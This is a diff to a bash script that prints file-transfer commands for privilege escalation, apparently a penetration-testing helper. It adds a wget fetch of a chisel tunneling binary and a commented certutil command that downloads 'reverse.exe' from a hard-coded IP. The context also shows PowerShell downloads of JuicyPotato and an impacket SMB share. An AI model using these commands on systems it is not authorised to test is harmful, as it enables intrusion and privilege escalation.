@@ -1,7 +1,6 @@
 #!/bin/bash
 
 # display file transfer commands for priv-esc
-# Apache2 server (port 80) is used by default
 
 Frame='\033[0;32m'   # Green
 Link='\033[0;35m'  	 # Purple
@@ -39,6 +38,7 @@ echo -e ""
 echo -e "${Frame}###${End} ${Title}Linux Local Enum Binaries${End} ${Frame}###${End}"
 echo -e "${Point} wget http://$host/pspy32 -O /tmp/pspy32; chmod +x /tmp/pspy32"
 echo -e "${Point} wget http://$host/pspy64 -O /tmp/pspy64; chmod +x /tmp/pspy64"
+echo -e "${Point} wget http://$host/chisel_amd64 -O /tmp/chisel_amd64; chmod +x /tmp/chisel_amd64"
 echo -e ""
 
 
@@ -64,6 +64,8 @@ echo -e "${Point} Powershell (New-Object System.Net.WebClient).DownloadFile('htt
 echo -e "${Point} Powershell (New-Object System.Net.WebClient).DownloadFile('http://$host/JuicyPotato64.exe','C:\\\Users\\\Public\\\Documents\\\JuicyPotato64.exe')"
 echo -e ""
 
+# certutil -urlcache -f http://192.168.49.201:443/reverse.exe reverse.exe
+
 
 echo -e "${Frame}###${End} ${Title}Transfer Through SMB Server${End} ${Frame}###${End}"
 echo -e "${Point} impacket-smbserver share . -username evil -password evil -smb2support"
@@ -73,5 +75,5 @@ echo -e "    copy target_to_kali.txt Z:\\"
 echo -e "    \\\\\\$ip\\\share\\\file.exe ${Comment}# run executable${End}"
 
 if [ "$runServer" == "true" ]; then
-	sudo python3 -m http.server $port --directory /var/www/html
+	sudo python3 -m http.server $port --directory /opt/exploitFiles
 fi
